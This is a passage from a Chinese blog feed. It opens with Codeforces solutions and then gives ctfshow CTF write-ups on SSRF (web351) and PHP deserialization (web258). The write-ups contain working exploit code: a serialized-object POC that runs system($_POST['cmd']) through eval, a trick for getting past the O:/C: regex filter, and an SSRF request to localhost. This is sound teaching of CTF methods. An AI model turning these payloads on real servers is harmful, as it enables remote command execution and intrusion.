class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 52</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn][maxn];</span><br><span class="line"><span class="keyword">int</span> dx[]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;,dy[]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;q;<span class="comment">//y,x</span></span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> m)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;n,&amp;m);<span class="comment">//ÐÐÁÐ </span></span><br><span class="line">    <span class="comment">//memset(a,-1,sizeof(a));</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(n,m);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    a[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">    a[<span class="number">1</span>][<span class="number">2</span>]=<span class="number">0</span>;</span><br><span class="line">    a[<span class="number">2</span>][<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    a[<span class="number">2</span>][<span class="number">2</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=<span class="number">50</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">2</span>;j+=<span class="number">2</span>)&#123;</span><br><span class="line">            a[i][j]=a[i<span class="number">-1</span>][j];</span><br><span class="line">            a[i][j+<span class="number">1</span>]=a[i<span class="number">-1</span>][j+<span class="number">1</span>];</span><br><span class="line">            a[i+<span class="number">1</span>][j]=!a[i<span class="number">-1</span>][j];</span><br><span class="line">            a[i+<span class="number">1</span>][j+<span class="number">1</span>]=!a[i<span class="number">-1</span>][j+<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">50</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">3</span>;j&lt;=<span class="number">50</span>;j+=<span class="number">2</span>)&#123;</span><br><span class="line">            a[i][j]=a[i][j<span class="number">-1</span>];</span><br><span class="line">            a[i+<span class="number">1</span>][j]=a[i+<span class="number">1</span>][j<span class="number">-1</span>];</span><br><span class="line">            a[i][j+<span class="number">1</span>]=!a[i][j<span class="number">-1</span>];</span><br><span class="line">            a[i+<span class="number">1</span>][j+<span class="number">1</span>]=!a[i+<span class="number">1</span>][j<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Line-Empire"><a href="#C-Line-Empire" class="headerlink" title="C. Line Empire"></a>C. Line Empire</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/05/Codeforces%20Round%20804(Div.2)/4.png" alt="4"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>这个题目的意思是，求符合条件的排列数量，要求任意子区间内，满足未出现过的最小值相同，求排列数。先考虑一个问题，首先0的位置一定要相等，因为没有包括0，那么结果一定为0，包括了0，结果一定不为0。那么再考虑1，若区间同时包括0和1，那么结果一定不为1，因此1的位置也必须相同。那么再考虑2，同样，区间需要包括0，1，2时，结果才不为2及以下的值，但是这个时候就有两种情况，2在0和1之间或者2不在0和1之间。若在，那么我们可以在0~1的位置内任意放置2，因为我们若想同时包括0和1，则必须包括2，那么这个时候，2就可以在区间内任意位置，对方案数做出贡献。如果不在，那么2同样也只能固定位置。以此类推，我们设置一个区间，若数在区间外，则扩展区间，若在区间内，则区间内剩余的位置都可以放置。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 500002</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> dx[]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;,dy[]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;q;<span class="comment">//y,x</span></span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;m);</span><br><span class="line">        a[m]=i;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">int</span> l=a[<span class="number">0</span>],r=a[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">int</span> range=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">bool</span> flag=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(a[i]&gt;r)&#123;</span><br><span class="line">            r=a[i];</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(a[i]&lt;l)&#123;</span><br><span class="line">            l=a[i];</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        range=r-l;</span><br><span class="line">        <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">            ans*=(range-i+<span class="number">1</span>);</span><br><span class="line">            ans%=mod;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">//init();</span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>啥也不说了，猛练吧。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;好久没打过cf了，今天重温一下，可能手比较生了，打得状态不太好。实时&lt;a href=&quot;https://www.bilibili.com/video/BV1xB4y1W79t/&quot;&gt;录屏&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="codeforces" scheme="http://example.com/categories/icpc/codeforces/"/>
    
    <category term="题解" scheme="http://example.com/categories/icpc/codeforces/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>ctfshow刷题记录-web351</title>
    <link href="http://example.com/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web351/"/>
    <id>http://example.com/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web351/</id>
    <published>2022-06-16T15:00:00.000Z</published>
    <updated>2022-06-17T12:23:01.523Z</updated>
    
    <content type="html"><![CDATA[<p>今天学学 <code>ssrf</code>，有些服务器的某些资源可能会规定请求必须来自内网才能访问资源，如果不是内网用户则会被拒，而 <code>ssrf</code> 就能为我们提供一个内网访问的通道。</p><span id="more"></span><h2 id="浅析ssrf"><a href="#浅析ssrf" class="headerlink" title="浅析ssrf"></a>浅析ssrf</h2><blockquote><p>在计算机安全中，服务器端请求伪造（英语：Server-side Request Forgery，简称SSRF）是攻击者滥用服务器功能来访问或操作无法被直接访问的信息的方式之一</p></blockquote><p>在之前做过的题目种，我们已经初步接触过本地网页限制访问资源的例子，但是我们都可以伪造，比如 <code>referer</code> 字段或者是 <code>X-Forwarded-for</code> 字段，因为包含在我们请求的 <code>headers</code> 中，因此我们可以直接伪造。但是 <code>$_SERVER</code> 就是我们所不能伪造的了，这个变量是什么呢？</p><blockquote><p>$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。这也就意味着大量的此类变量都会在<a href="http://www.faqs.org/rfcs/rfc3875">» CGI 1.1 规范</a>中说明，所以应该仔细研究一下。</p></blockquote><p>所以我们对 <code>SERVER</code> 变量进行校验即可判断请求是否来自本地，如果不来自本地则直接拒绝掉。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADDR&#x27;</span>]!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;非本地访问&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&#x27;flag&#123;test_flag&#125;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以发现是无法访问的。</p><p><img src="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web351/1.png" alt="1"></p><p>只有我们在本机使用环回地址才能访问成功。</p><p><img src="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web351/2.png" alt="2"></p><p>那么我们最主要就是如何让服务器代我们发起请求，如果能代我们发起请求，那就会造成给 <code>ssrf</code>。</p><h2 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一步一步解读。</p><p>第一个从 <code>url</code> 参数中获取 <code>url</code>。</p><ul><li><code>curl_init</code>：初始化一个 <code>cURL</code> 会话，参数可以为空，或者为一个 <code>url</code></li><li><code>curl_setopt</code>：设置 <code>cURL</code> 会话的一些属性。</li><li><code>curl_exec</code>：根据参数选项执行 <code>curl</code> 命令，并把结果返回给浏览器。</li><li><code>curl_close</code>：关闭会话</li></ul><p>就是直接可以请求一个网页，然后可以发现底下有 <code>flag.php</code>，但是只有本地能访问，因此在这里我们让 <code>curl</code> 去请求 <code>127.0.0.1/flag.php</code> 即可。</p><p><img src="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web351/3.png" alt="3"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天学学 &lt;code&gt;ssrf&lt;/code&gt;，有些服务器的某些资源可能会规定请求必须来自内网才能访问资源，如果不是内网用户则会被拒，而 &lt;code&gt;ssrf&lt;/code&gt; 就能为我们提供一个内网访问的通道。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="web" scheme="http://example.com/categories/ctf/web/"/>
    
    <category term="ssrf" scheme="http://example.com/categories/ctf/web/ssrf/"/>
    
    
  </entry>
  
  <entry>
    <title>ctfshow刷题记录-web258</title>
    <link href="http://example.com/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web258/"/>
    <id>http://example.com/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web258/</id>
    <published>2022-06-15T16:00:00.000Z</published>
    <updated>2022-06-15T17:54:32.503Z</updated>
    
    <content type="html"><![CDATA[<p>ctfshow的刷题记录-web258</p><span id="more"></span><p>反序列化寻思着多做点吧，反序列化主要就是写poc，去构造符合要求的对象。</p><h2 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> info();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过读源码可以发现有一个 <code>backDoor</code> 类，它能让我们使用 <code>eval</code> 进行命令执行。采用cookie传入poc反序列化，我们让 <code>ctfShowUser</code> 这个 <code>class</code> 属性为 <code>backDoor</code> 的一个对象，并且 <code>code</code> 需要我们任意可才能进行命令执行，执行 <code>getinfo</code> 即可触发，在 <code>ctfShowUser</code> 类中的析构函数会调用执行，于是我们写出如下 <code>poc</code>。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;system($_POST[&quot;cmd&quot;]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//eval($this-&gt;code);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="variable">$res</span>=serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span>(urlencode(<span class="variable">$res</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>写出poc之后还要注意，这里的 <code>poc</code> 不能有类似 <code>O:数字</code> 或者是 <code>C:数字</code> 的形式，并且无视大小写，那么我们需要绕过，通过在冒号后面加上一个 <code>+</code> 即可绕过，我们在反序列化对象时，可以加一个字符串替换，将 <code>O:</code> 替换为 <code>O:+</code>， <code>C:</code> 替换成 <code>C:+</code>，所以我们最终 <code>poc</code> 为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span 